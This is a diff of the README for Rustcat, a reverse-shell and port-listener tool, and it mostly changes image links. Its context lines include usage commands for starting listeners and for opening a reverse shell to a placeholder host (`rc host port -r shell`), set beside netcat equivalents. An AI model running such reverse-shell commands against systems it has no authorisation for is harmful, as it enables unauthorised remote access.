@@ -38,7 +38,8 @@
 <hr>
 
 # 🤔 What Is Rustcat?
-![Ex](https://raw.githubusercontent.com/robiot/rustcat/main/img/usage-ex.gif)
+![Ex](https://raw.githubusercontent.com/robiot/rustcat/main/img/example.gif)
+
 🎨 Rustcat is a modern port listener & Reverse Shell that is very easy to use.
 
 # ✨ Features
@@ -52,19 +53,18 @@
 
 ## 👶 Everything Easy
 ![Ex](https://raw.githubusercontent.com/robiot/rustcat/main/img/easy-revshell.gif)
+
 Starting a listener is just as simple as `rc -lp port`. While in netcat you would do something like `nc -nlvp port` to get the same results.
 
 And creating a reverse shell has never been easier, `rc host port -r shell` is all you need. No more long /dev/tcp stuff that you always forget.
 
 ## 📃 Command History
-![Appearance](https://raw.githubusercontent.com/robiot/rustcat/main/img/history-ex.gif)
+![Ex](https://raw.githubusercontent.com/robiot/rustcat/main/img/history.gif) ![Ex](https://raw.githubusercontent.com/robiot/rustcat/main/img/stty-history.gif)
 Command history is something we all need. How annoying isn't it when you accidently type a long command wrong, then you have to rewrite the entire thing.
 
 But Rustcat fixes that with command history. Just add -H and you will get command history (`rc -lHp port`), unlike netcat where you have to use another application and do `rlwrap -cAr nc -nlvp port`.
 
 ## 🎨 Appearance
-![Appearance](https://raw.githubusercontent.com/robiot/rustcat/main/img/easy.png)
-
 A little splash of color doesn't hurt :).
 
 # 📖 Full Installation Guide
